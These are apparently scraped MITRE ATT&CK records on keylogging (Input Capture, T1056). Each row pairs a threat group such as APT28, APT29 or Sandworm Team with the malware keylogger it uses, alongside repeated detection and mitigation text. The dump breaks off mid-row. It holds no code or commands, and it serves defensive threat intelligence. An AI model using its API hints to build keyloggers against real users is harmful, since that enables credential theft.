884,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['Moafee'],['Moafee'],['G0002'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
885,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0004|TinyZBot]] contains keylogger functionality.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: TinyZBot,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
886,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
887,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0023|CHOPSTICK]] is capable of performing keylogging.[[CiteRef::Crowdstrike DNC June 2016]][[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: CHOPSTICK, SPLM, ...","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
888,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0045|ADVSTORESHELL]] can perform keylogging.[[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: ADVSTORESHELL, NETUI, ...","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
889,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']","['[[Software/S0161|XAgentOSX]] contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure[[CiteRef::XAgentOSX]].']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: XAgentOSX,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
890,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Group/G0007|APT28]] can deploy a tool to perform keylogging.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
891,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0148|RTM]] can record keystrokes from both the keyboard and virtual keyboard.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: RTM,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
892,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0076|FakeM]] contains a keylogger module.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: FakeM,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
893,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['DragonOK'],['DragonOK'],['G0017'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
894,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0089|BlackEnergy]] has run a keylogger plug-in on a victim.[[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: BlackEnergy, Black Energy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
895,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0058|SslMM]] creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: SslMM,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
896,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['admin@338'],['admin@338'],['G0018'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
897,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0154|Cobalt Strike]] can track key presses with a keylogger module.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: Cobalt Strike,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
898,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Group/G0012|Darkhotel]] uses a sophisticated keylogger.[[CiteRef::Kaspersky Darkhotel]]'],['Darkhotel'],['Darkhotel'],['G0012'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
899,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0050|CosmicDuke]] uses a keylogger and steals clipboard contents from victims.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using 